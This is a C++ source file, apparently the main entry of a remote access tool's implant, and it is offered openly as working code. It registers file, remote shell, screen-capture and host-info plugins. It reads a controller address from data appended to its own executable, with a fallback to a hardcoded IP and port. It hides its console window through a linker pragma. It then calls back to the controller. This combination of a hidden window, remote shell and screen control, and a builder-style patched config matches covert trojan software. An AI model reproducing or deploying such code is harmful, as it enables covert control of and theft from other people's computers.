/*
 * Copyright (c) 2024, zz
 * All rights reserved.
 *
 * Author: zz <3875657991@qq.com>
 */

#include "server/server.h"
#include "manager/control_manager.h"
#include "plugins/file/file_control.h"
#include "plugins/host/host_control.h"
#include "plugins/screen/screen_control.h"
#include "plugins/shell/shell_control.h"
#include <plugins/file/file_define.h>
#include "utils/binary_overlay.h"

void register_plugins()
{
    auto deletor = [](Control* control) {
        delete control;
    };

    ControlManager::regist(kHostInfoPlugin, [] {
        return new HostControl;
    }, deletor);

#ifndef MEMORYLOAD
    ControlManager::regist(kFilePlugin, [] {
        return new FileControl;
    }, deletor);

    ControlManager::regist(kShellPlugin, [] {
        return new ShellControl;
    }, deletor);

    ControlManager::regist(kScreenPlugin, [] {
        return new ScreenControl;
    }, deletor);
#endif
}

void run()
{
    register_plugins();

    nlohmann::json config;
    config["server_ip"] = std::string("192.168.126.1");
    config["server_port"] = 8888;
    
    auto overlay = BinaryOverlay::readOverlay();
    auto json = nlohmann::json::parse(overlay, nullptr, false);
    if (json.is_discarded()) {
        json = config;
    }
    std::string server_ip = json["server_ip"];
    int server_port = json["server_port"];
    std::cout << server_ip << "," << server_port << std::endl;

    Server server(server_ip, server_port);
    server.run();
}

#pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")
int main(int argc, char *argv[]) {
    run();
}

